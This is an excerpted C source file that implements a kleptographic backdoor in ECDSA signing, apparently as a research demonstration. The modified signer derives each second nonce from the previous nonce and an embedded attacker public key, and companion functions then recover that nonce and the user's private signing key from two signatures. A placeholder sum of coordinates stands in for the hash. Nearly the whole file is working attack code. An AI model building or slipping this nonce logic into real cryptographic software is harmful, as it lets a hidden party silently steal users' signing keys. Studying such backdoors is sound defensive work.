...
//Nasser
uint64_t stored_ephemeral_key[NUM_ECC_DIGITS];
uint8_t counter = 0;
uint8_t public_v[ECC_BYTES+1]; 
...
int ecdsa_sign_synthetic_randomness(int counter, const uint8_t p_privateKey[ECC_BYTES], const uint8_t p_hash[ECC_BYTES], uint8_t p_signature[ECC_BYTES*2])
{
    ...
    printf("\nThis is ecdsa_sign_synthetic_randomness. \n");
	...
	/*Nasser: store k if this is the first signature - this will be used to generate the second k (k for the second signature).*/
	if(counter == 0)
	{
		printf("Generating the first signature, store ephemeral randomness k1 for next signature.\n");
		for(int i=0; i<NUM_ECC_DIGITS; i++) stored_ephemeral_key[i] = k[i];
	}
	...
	do
	{
		uint8_t tmp_k[ECC_BYTES];

		printf("Generating the second singature, generate ephemeral key using attacker's public key and previous ephemeral randomness.\n");
		compute_k_with_public(tmp_k);
		ecc_bytes2native(k, tmp_k);
    ...
    /*	
    uint8_t point_r_x[ECC_BYTES],point_r_y[ECC_BYTES];
    ecc_native2bytes(point_r_x, p.x);
    ecc_native2bytes(point_r_y, p.y);
    printf("This is point_r_x: (");
    for(int i=0; i<ECC_BYTES; i++) printf("%x ", point_r_x[i]);
    printf("). \n");

    printf("This is point_r_y: (");
    for(int i=0; i<ECC_BYTES; i++) printf("%x ", point_r_y[i]);
    printf("). \n");
    */
    //end nasser
...
int ecdsa_sign(const uint8_t p_privateKey[ECC_BYTES], const uint8_t p_hash[ECC_BYTES], uint8_t p_signature[ECC_BYTES*2])
{
	...
	//Nasser
	ecc_native2bytes(tmp_r, p.x);
	successful = is_okay(tmp_r,p_privateKey);
	if(successful) 
	{
		//printf("Got a good one, after %d trials \n", trials);
		//Nasser: R = p, r = p.x
		ecc_native2bytes(p_signature, p.x);
...
/*This is a dummy hash_point function for demonstration.
Instead of hashing, and instead of hashing 
add x-coordinate of point + its y-coordinate
hash = point.x + point.y % n
*/
void hash_point(uint64_t hashed_point[NUM_ECC_DIGITS], EccPoint point)
{	
	vli_modAdd(hashed_point,point.x, point.y, curve_n);
	return;
}

void test_retrieve_k(uint8_t p_signature[ECC_BYTES*2], const uint8_t p_hash[ECC_BYTES])
{

#if 0
	uint64_t l_r[NUM_ECC_DIGITS], l_s[NUM_ECC_DIGITS], e[NUM_ECC_DIGITS];
	uint64_t l_tmp[NUM_ECC_DIGITS], l_tmp1[NUM_ECC_DIGITS];
	uint64_t d_native[NUM_ECC_DIGITS];
	uint8_t d_bytes[ECC_BYTES];
	printf("This is test_retrieve_key\n");
	...
	vli_modMult(l_tmp, l_s, stored_ephemeral_key, curve_n); /* l_tmp = s*k */

	vli_modSub(l_tmp1, l_tmp,e, curve_p); /* l_tmp1 = sk - h(m)*/

	vli_modInv(l_r, l_r, curve_n); /* l_r = 1/r*/

	vli_modMult(d_native, l_tmp1, l_r, curve_n); /* d_native = (s*k - h(m))*(1/r) */

	ecc_native2bytes(d_bytes, d_native);
	
	printf("Retrieved key is: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%d ", d_bytes[i]);
	printf(").\n");
#endif
    	...
    	EccPoint r_point;
	uint8_t point_r_x[ECC_BYTES],point_r_y[ECC_BYTES];
	uint8_t r_bytes[ECC_BYTES+1];

	//first try with 2
	r_bytes[0] = 2;
	for(int i=0; i<ECC_BYTES; i++) r_bytes[i+1] = p_signature[i];
    
    	ecc_point_decompress(&r_point, r_bytes);



	ecc_native2bytes(point_r_x, r_point.x);
	ecc_native2bytes(point_r_y, r_point.y);


	printf("With r_bytes[0] = 2: \n");
	printf("This is point_r_x: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", point_r_x[i]);
	printf("). \n");
...
/*
This function generates a synthetically-random ephemeral key (k2) as follows:
k2 = H(V^(k1)).
Also, because this source code does not contain a hash function,
instead of hashing (V^(k1)), its x-coordinates is added to its 
y-coordinates (all modular n), which produces a 32-byte value
that could be used as the ephemeral key.
*/

void compute_k_with_public(uint8_t computed_key[ECC_BYTES])
{

	EccPoint r2,v_point;

	uint8_t r2_x[ECC_BYTES],r2_y[ECC_BYTES];

	uint64_t hashed_r2[NUM_ECC_DIGITS];
	uint8_t computed_k[ECC_BYTES];

	printf("This is compute_k_with_public \n");

	ecc_point_decompress(&v_point, public_v);

	//r2 = V^r1
	EccPoint_mult(&r2, &v_point, stored_ephemeral_key, NULL);
	
	ecc_native2bytes(r2_x, r2.x);
	ecc_native2bytes(r2_y, r2.y);


	
	printf("Z^r1: r2_x: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", r2_x[i]);
	printf("). \n");

	printf("Z^r1: r2_y: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", r2_y[i]);
	printf("). \n");

	
	//k2 = H(r2)
	hash_point(hashed_r2, r2);

	ecc_native2bytes(computed_k, hashed_r2);

	printf("Compute_with_public, this is computed_k: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", computed_k[i]);
	printf("). \n");

	for(int i=0; i<ECC_BYTES; i++) computed_key[i] = computed_k[i];
...
/*
This function retrieves the ephemeral key (k2) given:
1) the previous signature: p_signature (signature_1)
2) the current signature: p_Signature2
3) the attacker's private key: private_v

The ephemeral key (k2) is computed as follows:
k2 = H(R1^(v))


Also, for simplicity, and absence of hash in this source code, as done in function
"compute_k_with_public", instead of hashing, (R1^(v)) x-coordinates are added to its y-coordinates,
and the resulted 32-byte value is the ephemeral key.
(this is sufficient for our purpose).

Because r can correspond to two points on the curve (r_byte[0] = 2, and r_byte[0] = 3), each of these points is tested, and if the produced k2'
produces r' that is equivalent to the original r, then k2' = k2.
*/
void compute_k_with_private(uint8_t p_signature[ECC_BYTES*2], uint8_t p_signature2[ECC_BYTES*2], uint8_t private_v[ECC_BYTES], uint64_t k2[NUM_ECC_DIGITS])
{

	EccPoint r_point, r2_prime, p;
	uint8_t point_r_x[ECC_BYTES],point_r_y[ECC_BYTES];
	uint8_t r2_prime_x[ECC_BYTES],r2_prime_y[ECC_BYTES];
	uint8_t r_bytes[ECC_BYTES+1];

	uint64_t v_native[NUM_ECC_DIGITS];
	uint64_t r2[NUM_ECC_DIGITS];

	uint64_t hashed_r2_prime[NUM_ECC_DIGITS];
	uint8_t computed_k[ECC_BYTES];
	
 

	printf("\n");
	printf("This is compute_k_with_private. \n");
	printf("\n");

	//read r2 from signature and change to native
	ecc_bytes2native(r2, p_signature2);

	//change private key from bytes to native
	ecc_bytes2native(v_native, private_v);



	printf("Because R_x corresponds to two points on the curve (r_byte[0] = 2, and r_byte[0] = 3), ");
	printf("each of these points is tested, and if the produced k2 produces a point p where p.x is equivalent to the original R_x, then k2 is correct. \n");

	//first try with 2
	printf("First, try with r_bytes[0] = 2: \n");
	r_bytes[0] = 2;
	for(int i=0; i<ECC_BYTES; i++) r_bytes[i+1] = p_signature[i];
	...
	/*
	printf("R_x: point_r_x: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", point_r_x[i]);
	printf("). \n");

	printf("R_y: point_r_y: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", point_r_y[i]);
	printf("). \n");
	*/

	//r2_prime = R^v
	EccPoint_mult(&r2_prime, &r_point, v_native, NULL);
	ecc_native2bytes(r2_prime_x, r2_prime.x);
	ecc_native2bytes(r2_prime_y, r2_prime.y);


	
	printf("R1^z (z is attacker's private key): r2_prime_x: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", r2_prime_x[i]);
	printf("). \n");

	printf("R1^z (z is attacker's private key): r2_prime_y: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", r2_prime_y[i]);
	printf("). \n");

	//instead of hashing add x-coordinate of (R1^v) + its y-coordinate
	//hashed_r2_prime = r2_prime.x + r2_prime.y
	//vli_modAdd(hashed_r2_prime,r2_prime.x, r2_prime.y, curve_n);

	//k = H(R1^v)
	hash_point(hashed_r2_prime, r2_prime);
	ecc_native2bytes(computed_k, hashed_r2_prime);

	printf("Using (k = H(R1^z)), this is computed_k2: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", computed_k[i]);
	printf("). \n");

	
	//p = G^k
	EccPoint_mult(&p, &curve_G, hashed_r2_prime, NULL);

	printf("Set p = G^k2, and compare p.x with R2_x. \n");

	//check if r2 == p.x, if so, then k is the ephemeral key we're looking for.
	if(vli_cmp(p.x, r2) == 0)
	{
		printf("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n");
		printf("x-coordinate of p = G^k2 is R2_x. \n");
		printf("k2 must be the ephemeral randomness we're looking for.\n");

		for(int i=0; i<NUM_ECC_DIGITS; i++) k2[i] = hashed_r2_prime[i];
		return;	
	}
	else
	{
		printf("With r_bytes[0] = 2, the computed k2 produces a point p whose x-coordinate is not equivalent to the original R_x, ");
		printf("so now try with r_bytes[0] = 3 which should give the right R_x. \n\n");
	}
	...
	*/
	...
	//instead of hashing add x-coordinate of (R_1^v) + its y-coordinate
	//hashed_r2_prime = r2_prime.x + r2_prime.y
	//vli_modAdd(hashed_r2_prime,r2_prime.x, r2_prime.y, curve_n);
	...
	printf("Using (k = H(R^z)), this is computed_k2: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", computed_k[i]);
	printf("). \n");
	...
	{
		printf("We tried with both r_bytes[0] = 2 and r_bytes[0] = 3, none gave t k2' which produced a point p with p.x that is equivalent to the original R_x, ");
		printf("THIS SHOULD NEVER BE THE CASE. Something is wrong!!!!!!!!!!!!!!!!!!!!!. \n\n");
	}
...
/*
This function sets the public key of the attacker.
This public key will be used to compute k2 for the second
signature
*/
void set_public_v(uint8_t pv[ECC_BYTES+1])
{
...
/*
After receiving the second signature, the attacker calls this function to retrieve the long-term private key (d).
The attacker passes the following parameters:
1) the previous signature: p_signature (signature_1)
2) the current signature: p_Signature2
3) the message hash (H(m)): p_hash
4) the attacker's private key: private_v
 
This function first calles "compute_k_with_private" to compute k2, and then after that it proceeds to retrieve the long-term private key (d)
using:
d = (s2.k2 - H(m)).(r2^(-1)) mod n
*/
void retrieve_private_key(uint8_t p_signature[ECC_BYTES*2], uint8_t p_signature2[ECC_BYTES*2], const uint8_t p_hash[ECC_BYTES], uint8_t private_v[ECC_BYTES])
{

	uint64_t k2[NUM_ECC_DIGITS];
	uint8_t k2_bytes[ECC_BYTES];

	uint64_t r2[NUM_ECC_DIGITS], s2[NUM_ECC_DIGITS], e[NUM_ECC_DIGITS];
	uint64_t l_tmp[NUM_ECC_DIGITS], l_tmp1[NUM_ECC_DIGITS];
	...
	printf("This is retrieve_private_key. \n");
	printf("First compute k2 using attacker's private key.\n");


	//first retrieve/compute k2
	compute_k_with_private(p_signature, p_signature2, private_v, k2);

	ecc_native2bytes(k2_bytes, k2);

	printf("\n");
	printf("\n");

	printf("compute_k_with_private is finished. back to retrieve_private_key.\nk2: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%x ", k2_bytes[i]);
	printf("). \n");


	/*Now that k2 is computed, proceed to retrieve/recompute d*/
	...
	ecc_bytes2native(r2, p_signature2);
	ecc_bytes2native(s2, p_signature2 + ECC_BYTES);
	ecc_bytes2native(e, p_hash);

	vli_modMult(l_tmp, s2, k2, curve_n); /* l_tmp = s*k */

	vli_modSub(l_tmp1, l_tmp,e, curve_p); /* l_tmp1 = sk - h(m)*/

	vli_modInv(r2, r2, curve_n); /* r2 = 1/r2*/

	vli_modMult(d_native, l_tmp1, r2, curve_n); /* d_native = (s*k - h(m))*(1/r) */

	ecc_native2bytes(d_bytes, d_native);
	
	printf("Retrieved user's signing key is: (");
	for(int i=0; i<ECC_BYTES; i++) printf("%d ", d_bytes[i]);
	printf(").\n");
